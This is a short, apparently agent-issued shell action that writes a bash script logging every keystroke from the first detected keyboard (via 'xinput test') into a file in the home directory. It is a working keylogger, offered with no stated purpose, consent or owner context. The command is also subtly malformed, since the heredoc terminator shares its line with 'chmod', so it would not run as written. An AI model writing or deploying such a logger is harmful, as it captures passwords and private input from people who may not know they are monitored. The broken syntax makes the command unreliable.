action:
cat > script.sh <<'EOF'
#!/bin/bash
# Find keyboard device id
KEYBOARD_ID=$(xinput --list | grep -i keyboard | head -n1 | awk -F'id=' '{print $2}' | awk '{print $1}')
# Log file
LOGFILE="$HOME/keyboard_log.txt"
# Start logging
xinput test "$KEYBOARD_ID" >> "$LOGFILE" 2>&1
EOF && chmod +x script.sh
